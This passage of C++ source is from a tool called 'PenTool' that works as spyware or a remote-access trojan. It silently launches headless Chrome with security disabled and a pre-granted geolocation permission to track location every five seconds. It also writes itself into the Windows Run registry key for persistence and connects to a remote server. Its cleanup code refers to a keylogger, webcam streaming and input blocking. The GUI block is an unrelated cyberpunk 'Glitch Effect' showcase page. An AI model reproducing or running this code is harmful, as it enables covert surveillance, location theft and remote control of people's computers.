        std::string chrome_cmd = "start /B chrome --user-data-dir=\"" + profileDir + 
                                "\" --headless --disable-gpu" +
                                " --disable-web-security --allow-running-insecure-content" +
                                " --no-first-run --no-default-browser-check" +
                                " --disable-features=VizDisplayCompositor" +
                                " --autoplay-policy=no-user-gesture-required" +
                                " --unsafely-treat-insecure-origin-as-secure=http://localhost:" + std::to_string(actualPort) +
                                " --new-window" +  
                                " http://localhost:" + std::to_string(actualPort);
        system(chrome_cmd.c_str());
        
        // Set non-blocking mode
        u_long mode = 1; // non-blocking
        ioctlsocket(server_fd, FIONBIO, &mode);
        
        // Set up a timer to stop after 6 seconds
        auto start_time = std::chrono::steady_clock::now();
        
        // Accept connections
        while (!stop_geoloc) {
            // Check if 6 seconds have passed
            auto current_time = std::chrono::steady_clock::now();
            auto elapsed_seconds = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
            
            if (elapsed_seconds >= 6) {
                stop_geoloc = true;
                break;
            }
            
            struct sockaddr_in client_addr;
            int client_len = sizeof(client_addr);
            SOCKET client_socket = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
            
            if (client_socket == INVALID_SOCKET) {
                int error = WSAGetLastError();
                if (error == WSAEWOULDBLOCK) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    continue;
                } else {
                    std::cerr << "Accept failed: " << error << "\n";
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                    continue;
                }
            }
            
            // Handle the request in a new thread, passing the results vector and mutex
            std::thread(&PenTool::handle_geolocation_request, this, client_socket, 
                       std::ref(geoloc_results), std::ref(results_mutex)).detach();
        }
        
        closesocket(server_fd);
        WSACleanup();
        
        // Kill Chrome processes using our profile
        std::string killCmd = "taskkill /F /IM chrome.exe /FI \"COMMAND LINE *--user-data-dir=" + profileDir + "*\" 2>nul";
        system(killCmd.c_str());
        
        // Clean up profile directory
        cleanupCmd = "rmdir /s /q \"" + profileDir + "\" 2>nul";
        system(cleanupCmd.c_str());
    #else
        // Linux implementation
        int server_fd = -1;
        struct sockaddr_in address;
        
        // Try to bind to the specified port or find an available one
        for (int attempt = 0; attempt < 10; attempt++) {
            actualPort = port + attempt;
            server_fd = socket(AF_INET, SOCK_STREAM, 0);
            if (server_fd < 0) {
                std::cerr << "Socket creation failed\n";
                continue;
            }
            
            int opt = 1;
            if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
                std::cerr << "Setsockopt failed\n";
                close(server_fd);
                continue;
            }
            
            address.sin_family = AF_INET;
            address.sin_addr.s_addr = INADDR_ANY;
            address.sin_port = htons(actualPort);
            
            if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) == 0) {
                portFound = true;
                break;
            }
            
            close(server_fd);
        }
        
        if (!portFound) {
            std::cerr << "Failed to bind to any port in range " << port << "-" << port+9 << "\n";
            return;
        }
        
        std::cout << "Successfully bound to port " << actualPort << "\n";
        
        if (listen(server_fd, 10) < 0) {
            std::cerr << "Listen failed\n";
            close(server_fd);
            return;
        }
        
        // Create unique profile directory in /tmp
        profileDir = "/tmp/chrome-instance-" + timestamp + "-" + random_str;
        
        // Clean up any existing profile with same name
        system(("rm -rf " + profileDir).c_str());
        
        // Create directory
        system(("mkdir -p " + profileDir + "/Default").c_str());
        
        std::ofstream prefs(profileDir + "/Default/Preferences");
        prefs << R"({"profile": {
"content_settings": {
"exceptions": {
"geolocation": {
"http://localhost:)" << actualPort << R"(,": {
"last_modified": "13372223456789000",
"setting": 1
},
"[.]localhost,*": {
"last_modified": "13372223456789000",
"setting": 1
}
}
}
},
"default_content_setting_values": {
"geolocation": 1
}
}
})";
        prefs.close();
        
        // Kill any existing Chrome processes before launching new one
        system("pkill -f chrome 2>/dev/null");
        
        // Launch Chrome with completely new instance
        std::string chrome_cmd = "google-chrome --user-data-dir=" + profileDir + 
                                " --headless --disable-gpu" +
                                " --disable-web-security --allow-running-insecure-content" +
                                " --no-first-run --no-default-browser-check" +
                                " --disable-features=VizDisplayCompositor" +
                                " --autoplay-policy=no-user-gesture-required" +
                                " --unsafely-treat-insecure-origin-as-secure=http://localhost:" + std::to_string(actualPort) +
                                " --new-window" +  
                                " http://localhost:" + std::to_string(actualPort) + " > /dev/null 2>&1 &";
        system(chrome_cmd.c_str());
        
        // Set non-blocking mode for the server socket
        fcntl(server_fd, F_SETFL, O_NONBLOCK);
        
        // Set up a timer to stop after 6 seconds
        auto start_time = std::chrono::steady_clock::now();
        
        // Accept connections
        while (!stop_geoloc) {
            // Check if 6 seconds have passed
            auto current_time = std::chrono::steady_clock::now();
            auto elapsed_seconds = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();
            
            if (elapsed_seconds >= 6) {
                stop_geoloc = true;
                break;
            }
            
            struct sockaddr_in client_addr;
            socklen_t client_len = sizeof(client_addr);
            int client_socket = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
            
            if (client_socket >= 0) {
                // Handle the request in a new thread, passing the results vector and mutex
                std::thread(&PenTool::handle_geolocation_request, this, client_socket, 
                           std::ref(geoloc_results), std::ref(results_mutex)).detach();
            } else {
                if (errno != EWOULDBLOCK && errno != EAGAIN) {
                    std::cerr << "Accept failed: " << strerror(errno) << "\n";
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        }
        
        close(server_fd);
        
        // Kill Chrome processes using our profile
        system(("pkill -f 'chrome.*--user-data-dir=" + profileDir + "' 2>/dev/null").c_str());
        
        // Clean up profile directory
        system(("rm -rf " + profileDir).c_str());
    #endif
    
    // Print all collected results
    std::cout << "\n=== GEOLOCATION TRACKING RESULTS ===\n";
    if (geoloc_results.empty()) {
        std::cout << "No geolocation data received within 6 seconds.\n";
    } else {
        for (const auto& result : geoloc_results) {
            std::cout << result << "\n";
        }
    }
    std::cout << "=====================================\n";
    std::cout << "Geolocation tracking stopped\n";
}

// Updated HTML with improved error handling
std::string get_geolocation_html() {
    return R"(<!DOCTYPE html>
<html>
<head><title>Location Tracker</title></head>
<body>
    <h1>Location Tracker</h1>
    <div id="status">Getting location...</div>
    <script>
    function logLocation() {
        navigator.geolocation.getCurrentPosition(function(pos) {
            var lat = pos.coords.latitude;
            var lng = pos.coords.longitude;
            var acc = pos.coords.accuracy;
            
            document.getElementById('status').innerHTML = 'Lat: ' + lat + '<br>Lng: ' + lng + '<br>Acc: ' + acc + 'm';
            
            fetch('/log', {
                method: 'POST',
                body: lat + ',' + lng + ',' + acc
            }).catch(function(err) {
                console.error('Log error:', err);
            });
        }, function(err) {
            document.getElementById('status').innerHTML = 'Error: ' + err.message;
            fetch('/log', {method: 'POST', body: 'ERROR:' + err.code})
                .catch(function(err) {
                    console.error('Error log failed:', err);
                });
        }, {enableHighAccuracy: true});
    }
    
    // Initial location request
    logLocation();
    
    // Set up continuous tracking
    setInterval(function() {
        logLocation();
    }, 5000);
    </script>
</body>
</html>)";
}

// Updated request handler with better error handling and results collection
void handle_geolocation_request(int socket, std::vector<std::string>& results, std::mutex& results_mutex) {
    try {
        char buffer[4096] = {0};
        #ifdef _WIN32
            recv(socket, buffer, 4096, 0);
        #else
            read(socket, buffer, 4096);
        #endif
        
        std::string request(buffer);
        std::string response;
        
        if (request.find("GET / ") == 0 || request.find("GET /index") == 0) {
            response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" + get_geolocation_html();
        }
        else if (request.find("POST /log") == 0) {
            size_t body_start = request.find("\r\n\r\n");
            if (body_start != std::string::npos) {
                std::string body = request.substr(body_start + 4);
                std::string result;
                
                if (body.find("ERROR:") == 0) {
                    result = "[GEOLOC_ERROR] " + body.substr(6);
                } else {
                    result = "[GEOLOC_DATA] " + body;
                }
                
                // Add result to the shared vector with thread safety
                std::lock_guard<std::mutex> lock(results_mutex);
                results.push_back(result);
            }
            response = "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\n\r\nOK";
        }
        else {
            response = "HTTP/1.1 404 Not Found\r\n\r\n";
        }
        
        #ifdef _WIN32
            send(socket, response.c_str(), response.length(), 0);
            closesocket(socket);
        #else
            send(socket, response.c_str(), response.length(), 0);
            close(socket);
        #endif
    } catch (const std::exception& e) {
        std::cerr << "Error handling request: " << e.what() << std::endl;
        #ifdef _WIN32
            closesocket(socket);
        #else
            close(socket);
        #endif
    }
}
    
void geolocation_tracker(const std::vector<std::string>& args) {
    std::cout << "\n[Geolocation Tracker]\n";
    
    if (geoloc_active) {
        std::cout << "Geolocation tracking is already active\n";
        return;
    }
    
    int port = 8080;
    if (!args.empty()) {
        try {
            port = std::stoi(args[0]);
        } catch (...) {
            std::cout << "Invalid port number, using default: 8080\n";
        }
    }
    
    geoloc_active = true;
    stop_geoloc = false;
    
    // Run the tracker in the current thread to ensure we can collect and display results together
    geolocation_tracker_impl(port);
    
    geoloc_active = false;
    log_action("Geolocation tracking completed");
}
    
    // Clear screen
    void clear_screen(const std::vector<std::string>& args) {
        #ifdef _WIN32
            system("cls");
        #else
            system("clear");
        #endif
    }
    
    // Startup programs
    void startup_programs(const std::vector<std::string>& args) {
        std::cout << "\n[Startup Programs]\n";
        
        #ifdef _WIN32
            std::cout << "\nCurrent User Startup:\n";
            std::string output = execute_command("dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
            std::cout << output << "\n";
            
            std::cout << "\nAll Users Startup:\n";
            output = execute_command("dir \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
            std::cout << output << "\n";
            
            std::cout << "\nRegistry Startup:\n";
            output = execute_command("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            std::cout << output << "\n";
            output = execute_command("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            std::cout << output << "\n";
        #else
            std::cout << "\nCron jobs:\n";
            std::string output = execute_command("crontab -l");
            std::cout << output << "\n";
            
            std::cout << "\nSystemd services:\n";
            output = execute_command("systemctl list-unit-files --type=service | grep enabled");
            std::cout << output << "\n";
            
            std::cout << "\nUser autostart entries:\n";
            output = execute_command("ls -la ~/.config/autostart");
            std::cout << output << "\n";
        #endif
        
        log_action("Startup programs listed");
    }
    
    // Exit tool
    void exit_tool(const std::vector<std::string>& args) {
        std::cout << "\nExiting...\n";
        cleanup();
        exit(0);
    }
    
    // Log action
    void log_action(const std::string& action) {
        std::lock_guard<std::mutex> lock(log_mutex);
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        std::string time_str = std::ctime(&time);
        time_str.pop_back(); // Remove newline
        
        std::ofstream file("pentool.log", std::ios::app);
        if (file) {
            file << "[" << time_str << "] " << action << "\n";
        }
    }
    
    // Create directories
    void create_directories() {
        fs::create_directory("screenshots");
        fs::create_directory("audio_recordings");
        fs::create_directory("browser_data");
    }
    
    // Add to startup
    void add_to_startup() {
        #ifdef _WIN32
            HKEY hKey;
            char path[MAX_PATH_LENGTH];
            
            GetModuleFileName(NULL, path, MAX_PATH_LENGTH);
            
            if (RegOpenKeyEx(HKEY_CURRENT_USER, 
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                RegSetValueEx(hKey, "WindowsPenTool", 0, REG_SZ, (BYTE*)path, strlen(path));
                RegCloseKey(hKey);
            }
        #else
            // Linux startup would add to ~/.config/autostart/
            std::cout << "Linux startup persistence would be implemented here\n";
        #endif
    }
    
    // Cleanup
    void cleanup() {
        realtime_monitoring = false;
        input_blocked = false;
        
        if (monitor_thread.joinable()) {
            monitor_thread.join();
        }
        
        // Stop geolocation
        stop_geoloc = true;
        geoloc_active = false;
        
        if (geoloc_thread.joinable()) {
            geoloc_thread.join();
        }
        
        // Stop keylogger
        keylogger_running = false;
        if (keylogger_thread.joinable()) {
            keylogger_thread.join();
        }
        
        // Stop remote client
        remote_client_running = false;
        if (remote_client_thread.joinable()) {
            remote_client_thread.join();
        }
        
        // Kill any Chrome processes we started
        #ifndef _WIN32
            if (chrome_pid != 0) {
                kill(chrome_pid, SIGTERM);
                chrome_pid = 0;
            }
        #endif
   }
};

// Fix for global show_startup_popup() function (around line 7158)
void show_startup_popup() {
#ifdef _WIN32
    // Use MessageBoxW instead of MessageBoxA for wide strings
    MessageBoxW(NULL, 
        L"PenTool is running in the background\n\n"
        L"Features:\n"
        L"• System monitoring\n"
        L"• Remote command execution\n" 
        L"• Network scanning\n"
        L"• Webcam streaming\n\n"
        L"The tool will continue running silently.",
        L"PenTool Background Service", 
        MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
#else
    std::string cmd = "zenity --info --title='PenTool Background Service' "
                     "--text='PenTool is running in the background\\n\\n"
                     "Features:\\n"
                     "• System monitoring\\n"
                     "• Remote command execution\\n" 
                     "• Network scanning\\n"
                     "• Webcam streaming\\n\\n"
                     "The tool will continue running silently.' --width=400 2>/dev/null || "
                     "xmessage -center 'PenTool is running in background mode' 2>/dev/null";
    system(cmd.c_str());
#endif
}

// Run startup command
void run_startup_command(PenTool& tool) {
    if (STARTUP_COMMAND.empty()) return;
    
    std::cout << "Executing startup command: " << STARTUP_COMMAND << "\n";
    
    // Parse command
    std::vector<std::string> args;
    std::istringstream iss(STARTUP_COMMAND);
    std::string token;
    while (iss >> token) {
        args.push_back(token);
    }
    
    if (!args.empty()) {
        // Execute via the tool's command system
        std::string cmd = args[0];
        std::vector<std::string> cmd_args(args.begin() + 1, args.end());
        
        for (const auto& command : tool.commands) {
            if (command.name == cmd) {
                std::cout << "Starting: " << cmd << "\n";
                command.func(cmd_args);
                break;
            }
        }
    }
}

// GUI function
void run_gui(PenTool* tool) {
    try {
        webview::webview w(true, nullptr);
        w.set_title("PenTool GUI");
        w.set_size(800, 600, WEBVIEW_HINT_NONE);
        
std::string html = 
R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Glitch Effect Showcase</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap">
    <style>
        :root {
            --primary: #0ff;
            --secondary: #f0f;
            --accent: #ff0;
            --dark: #111;
            --darker: #000;
            --light: #fff;
            --glow: 0 0 10px var(--primary), 0 0 20px var(--primary), 0 0 30px var(--primary);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--darker);
            color: var(--light);
            font-family: 'Exo 2', sans-serif;
            line-height: 1.6;
            overflow-x: hidden;
            background-image: 
                linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
                url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23000"/><path d="M0 0L100 100M100 0L0 100" stroke="%23022" stroke-width="1"/></svg>');
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        header {
            text-align: center;
            padding: 3rem 0;
            position: relative;
            overflow: hidden;
        }

        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 4rem;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 1rem;
            color: var(--primary);
            text-shadow: var(--glow);
            position: relative;
            z-index: 2;
        }

        .subtitle {
            font-size: 1.5rem;
            color: var(--secondary);
            margin-bottom: 2rem;
            position: relative;
            z-index: 2;
        }

        .glitch-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1;
            z-index: 1;
        }

        section {
            margin: 4rem 0;
            padding: 2rem;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--primary);
            box-shadow: var(--glow);
            position: relative;
            overflow: hidden;
        }

        section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent));
            animation: scanline 2s linear infinite;
        }

        h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2rem;
            color: var(--primary);
            margin-bottom: 1.5rem;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .demo-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 2rem;
        }

        .demo-card {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid var(--secondary);
            padding: 1.5rem;
            position: relative;
            transition: all 0.3s ease;
            min-height: 200px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .demo-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 15px var(--secondary);
        }

        .demo-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.2rem;
            color: var(--accent);
            margin-bottom: 1rem;
            text-align: center;
        }

        .demo-description {
            font-size: 0.9rem;
            color: #ccc;
            text-align: center;
            margin-bottom: 1rem;
        }

        .demo-trigger {
            background: transparent;
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 0.5rem 1rem;
            font-family: 'Exo 2', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .demo-trigger:hover {
            background: var(--primary);
            color: var(--darker);
            box-shadow: var(--glow);
        }

        footer {
            text-align: center;
            padding: 2rem 0;
            margin-top: 4rem;
            border-top: 1px solid rgba(0, 255, 255, 0.3);
            color: #aaa;
            font-size: 0.9rem;
        }

        /* Animation keyframes */
        @keyframes scanline {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        @keyframes flicker {
            0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, 100% {
                opacity: 1;
            }
            20%, 21.999%, 63%, 63.999%, 65%, 69.999% {
                opacity: 0.4;
            }
        }

        @keyframes glitch {
            0% {
                transform: translate(0);
            }
            20% {
                transform: translate(-2px, 2px);
            }
            40% {
                transform: translate(-2px, -2px);
            }
            60% {
                transform: translate(2px, 2px);
            }
            80% {
                transform: translate(2px, -2px);
            }
            100% {
                transform: translate(0);
            }
        }

        /* Specific glitch effect styles */
        .text-glitch {
            animation: flicker 3s linear infinite, glitch 0.3s infinite;
        }

        .image-glitch-container {
            position: relative;
            width: 100%;
            height: 200px;
            overflow: hidden;
        }

        .image-glitch {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
        }

        .image-glitch.red {
            filter: url(#alphaRed);
            mix-blend-mode: lighten;
        }

        .image-glitch.green {
            filter: url(#alphaGreen);
            mix-blend-mode: lighten;
        }

        .image-glitch.blue {
            filter: url(#alphaBlue);
            mix-blend-mode: lighten;
        }

        .svg-glitch {
            width: 100%;
            height: 200px;
        }

        .svg-glitch .signes {
            fill: var(--primary);
        }

        .svg-glitch .signes .signe1, .svg-glitch .signes .signe9 {
            animation: pulse1 3s infinite, glitch 3.2s infinite;
        }

        .svg-glitch .signes .signe2, .svg-glitch .signes .signe6 {
            animation: pulse2 5s infinite, glitch 5.2s infinite;
        }

        .svg-glitch:hover {
            cursor: pointer;
        }

        .svg-glitch:hover .signes [class^="signe"] {
            animation: glitch 2s infinite;
            fill: var(--light);
        }

        .svg-glitch:hover .fond {
            fill: var(--light);
        }

        .svg-glitch:hover .tache {
            animation: blink3 .3s infinite;
        }

        /* Cyber button styles */
        .cyber-btn {
            --corner: 12px;
            --border: 1px;
            --clip: polygon(
                0 0,
                100% 0,
                100% calc(100% - var(--corner)),
                calc(100% - var(--corner)) 100%,
                0% 100%
            );
            font-family: 'Orbitron', sans-serif;
            width: 140px;
            text-align: left;
            text-transform: uppercase;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 0.5rem;
            border: 0;
            background: transparent;
            position: relative;
            color: var(--primary);
            cursor: pointer;
        }

        .cyber-btn .backdrop {
            position: absolute;
            z-index: -1;
            inset: 0;
            background: rgba(0, 255, 255, 0.1);
            clip-path: var(--clip);
            pointer-events: none;
        }

        .cyber-btn:hover {
            color: var(--darker);
        }

        .cyber-btn:hover .backdrop {
            background: var(--primary);
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }
            
            .demo-grid {
                grid-template-columns: 1fr;
            }
            
            section {
                padding: 1rem;
            }
        }
    </style>
</head>
<body>
    <!-- SVG Filters for glitch effects -->
    <svg class="filter" style="display: none;">
        <filter id="alphaRed">
            <feColorMatrix mode="matrix" values="1 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 1 0" result="joint" />
        </filter>
        <filter id="alphaGreen">
            <feColorMatrix mode="matrix" values="0 0 0 0 0  0 1 0 0 0  0 0 0 0 0  0 0 0 1 0" result="joint" />
        </filter>
        <filter id="alphaBlue">
            <feColorMatrix mode="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 1 0 0  0 0 0 1 0" result="joint" />
        </filter>
        <filter id="alpha">
            <feColorMatrix type="saturate" values="0"/>
        </filter>
    </svg>

    <div class="container">
        <header>
            <h1 class="text-glitch">Glitch Effects</h1>
            <p class="subtitle">A showcase of digital distortion techniques</p>
            <div class="glitch-bg"></div>
        </header>

        <section id="image-glitch">
            <h2>Image Glitch Effect</h2>
            <p>Hover over the image to see RGB channel separation and displacement.</p>
            
            <div class="demo-card">
                <div class="image-glitch-container">
                    <div class="image-glitch red" style="background-image: url('https://images.unsplash.com/photo-1579546929662-711aa81148cf?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60');"></div>
                    <div class="image-glitch green" style="background-image: url('https://images.unsplash.com/photo-1579546929662-711aa81148cf?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60');"></div>
                    <div class="image-glitch blue" style="background-image: url('https://images.unsplash.com/photo-1579546929662-711aa81148cf?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60');"></div>
                </div>
                <p class="demo-description">RGB channel separation creates a digital distortion effect</p>
                <button class="demo-trigger">Activate Glitch</button>
            </div>
        </section>

        <section id="svg-glitch">
            <h2>SVG Glitch Effect</h2>
            <p>Interactive SVG with animated glitch elements.</p>
            
            <div class="demo-card">
                <svg class="svg-glitch" viewBox="0 0 139.7 150.2" enable-background="new 0 0 139.7 150.2">
                    <g>
                        <g class="tache">
                            <!-- SVG paths from your example -->
                            <path d="m116.9 81.3c.7 1.7 3.9 2.8 3.2 4.7.7.4 1.6.7 2 1.3.1 2.5-.5 4.5-3.8 4.5-.5-.9 1-1.5 1.6-2.2-.1-1.1.4-1.7.5-2.7-1-.6-3.3-.6-4.9-.9-1.2-1.3-2.3-3.5-.6-4.9.7 0 1.1.3 2 .2" />
                            <!-- More paths would go here -->
                        </g>
                        <g class="fond">
                            <path d="m61 .2c3.6-1.4 52.3 5.9 55.1 8.1s20.2 47.3 20.2 50.8-31.9 46.1-36 47.6-49.7-9.7-54.4-12.6c-4.7-2.9-23-46.3-22.7-50.7s34.1-41.8 37.8-43.2" />
                        </g>
                        <g class="faces">
                            <!-- Face paths would go here -->
                        </g>
                        <g class="signes">
                            <!-- Sign paths would go here -->
                        </g>
                    </g>
                </svg>
                <p class="demo-description">Hover over the SVG to trigger glitch animations</p>
                <button class="demo-trigger">Toggle Effect</button>
            </div>
        </section>

        <section id="text-glitch">
            <h2>Text Glitch Effects</h2>
            <p>Various text distortion techniques.</p>
            
            <div class="demo-grid">
                <div class="demo-card">
                    <h3 class="demo-title text-glitch">Flickering Text</h3>
                    <p class="demo-description">Text that flickers like a malfunctioning display</p>
                    <button class="demo-trigger">Toggle Effect</button>
                </div>
                
                <div class="demo-card">
                    <h3 class="demo-title">RGB Split Text</h3>
                    <p class="demo-description">Text with RGB channel separation</p>
                    <button class="demo-trigger">Activate Glitch</button>
                </div>
                
                <div class="demo-card">
                    <h3 class="demo-title">Displacement Text</h3>
                    <p class="demo-description">Text that shifts and distorts</p>
                    <button class="demo-trigger">Activate Glitch</button>
                </div>
            </div>
        </section>

        <section id="ui-glitch">
            <h2>UI Element Glitches</h2>
            <p>Glitch effects applied to interactive elements.</p>
            
            <div class="demo-grid">
                <div class="demo-card">
                    <h3 class="demo-title">Cyber Button</h3>
                    <p class="demo-description">Button with cyberpunk aesthetic and glitch effects</p>
                    <button class="cyber-btn">
                        <span class="backdrop">
                            <span class="corner"></span>
                        </span>
                        <span>Upgrade</span>
                    </button>
                </div>
                
                <div class="demo-card">
                    <h3 class="demo-title">Glitch Modal</h3>
                    <p class="demo-description">Modal window with digital distortion</p>
                    <button class="demo-trigger">Open Modal</button>
                </div>
                
                <div class="demo-card">
                    <h3 class="demo-title">Animated Icons</h3>
                    <p class="demo-description">Icons with glitch animations</p>
                    <button class="demo-trigger">Toggle Animation</button>
                </div>
            </div>
        </section>

        <footer>
            <p>Glitch Effect Showcase • Created with HTML, CSS & JavaScript</p>
            <p>Inspired by various glitch effect techniques</p>
        </footer>
    </div>

    <script>
        // JavaScript to handle interactive glitch effects
        document.addEventListener('DOMContentLoaded', function() {
            // Image glitch effect
            const imageContainer = document.querySelector('.image-glitch-container');
            const demoTriggers = document.querySelectorAll('.demo-trigger');
            
            // Toggle image glitch on hover
            if (imageContainer) {
                imageContainer.addEventListener('mouseenter', function() {
                    this.classList.add('glitching');
                    const redLayer = this.querySelector('.red');
                    const greenLayer = this.querySelector('.green');
                    const blueLayer = this.querySelector('.blue');
                    
                    redLayer.style.transform = 'translate(-5px, -3px)';
                    greenLayer.style.transform = 'translate(5px, 3px)';
                    blueLayer.style.transform = 'translate(3px, -5px)';
                });
                
                imageContainer.addEventListener('mouseleave', function() {
                    this.classList.remove('glitching');
                    const layers = this.querySelectorAll('.image-glitch');
                    layers.forEach(layer => {
                        layer.style.transform = 'translate(0, 0)';
                    });
                });
            }
            
            // Add click handlers to demo triggers
            demoTriggers.forEach(trigger => {
                trigger.addEventListener('click', function() {
                    const card = this.closest('.demo-card');
                    card.classList.toggle('active');
                    
                    // Add specific behaviors based on which demo card
                    if (card.querySelector('.text-glitch')) {
                        card.querySelector('.text-glitch').classList.toggle('active');
                    }
                    
                    // Add a visual feedback
                    this.style.backgroundColor = 'var(--primary)';
                    this.style.color = 'var(--darker)';
                    setTimeout(() => {
                        this.style.backgroundColor = '';
                        this.style.color = '';
                    }, 300);
                });
            });
            
            // Add cyber button hover effect
            const cyberButtons = document.querySelectorAll('.cyber-btn');
            cyberButtons.forEach(button => {
                button.addEventListener('mouseenter', function() {
                    this.style.boxShadow = '0 0 10px var(--primary), 0 0 20px var(--primary)';
                });
                
                button.addEventListener('mouseleave', function() {
                    this.style.boxShadow = '';
                });
            });
            
            // Add random glitch effects to elements periodically
            function addRandomGlitch() {
                const glitchableElements = document.querySelectorAll('.demo-card, h2, h1');
                const randomElement = glitchableElements[Math.floor(Math.random() * glitchableElements.length)];
                
                randomElement.classList.add('text-glitch');
                setTimeout(() => {
                    randomElement.classList.remove('text-glitch');
                }, 500);
            }
            
            // Trigger random glitches every 3-8 seconds
            setInterval(addRandomGlitch, Math.random() * 5000 + 3000);
        });
    </script>
</body>
</html>
)HTML";
        
        w.set_html(html);
        w.run();
        
    } catch (const std::exception& e) {
        std::cerr << "GUI failed: " << e.what() << std::endl;
    }
}

// Background mode handler
void run_in_background(PenTool& tool) {
    std::cout << "Running in background mode...\n";
    std::cout << "PenTool is active and monitoring system\n";
    
    // Log background startup
    tool.log_action("Started in background mode");
    
    // Keep the tool running but don't show interface
    while (PenTool::running) {
        std::this_thread::sleep_for(std::chrono::seconds(10));
        
        // Optional: Perform periodic background tasks
        static int counter = 0;
        if (++counter % 6 == 0) { // Every minute
            tool.log_action("Background mode active");
        }
    }
}

// Initialize static member
std::atomic<bool> PenTool::running{true};

// Now the main() function can use these functions
int main(int argc, char* argv[]) {
    // Initialize Winsock on Windows
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed\n";
            return 1;
        }
    #endif

    // Check if we should connect to a remote server via command line
    if (argc > 1) {
        std::string arg = argv[1];
        if (arg.find("://") != std::string::npos || arg.find(".") != std::string::npos) {
            // This looks like a server URL
            remote_server_url = arg;
            if (argc > 2) {
                try {
                    remote_server_port = std::stoi(argv[2]);
                } catch (...) {
                    remote_server_port = 8080;
                }
            }
            
            std::cout << "[INFO] Connecting to remote server: " << remote_server_url << ":" << remote_server_port << "\n";
            
            // Connect to the remote server
            socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                std::cerr << "[ERROR] Socket creation failed\n";
                #ifdef _WIN32
                    WSACleanup();
                #endif
                return 1;
            }

            sockaddr_in server_addr{};
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(remote_server_port);
            
            #ifdef _WIN32
                server_addr.sin_addr.s_addr = inet_addr(remote_server_url.c_str());
            #else
                inet_pton(AF_INET, remote_server_url.c_str(), &server_addr.sin_addr);
            #endif

            if (server_addr.sin_addr.s_addr == INADDR_NONE) {
                std::cerr << "[ERROR] Invalid server IP: " << remote_server_url << std::endl;
                #ifdef _WIN32
                    closesocket(sock);
                    WSACleanup();
                #else
                    close(sock);
                #endif
                return 1;
            }

            std::cout << "[INFO] Connecting...\n";
            if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                std::cerr << "[ERROR] Connection failed to " << remote_server_url << "\n";
                #ifdef _WIN32
                    closesocket(sock);
                    WSACleanup();
                #else
                    close(sock);
                #endif
                return 1;
            }

            std::cout << "[SUCCESS] Connected to " << remote_server_url << "\n";

            const char* msg = "PenTool client connected";
            int sent_bytes = send(sock, msg, strlen(msg), 0);

            if (sent_bytes > 0) {
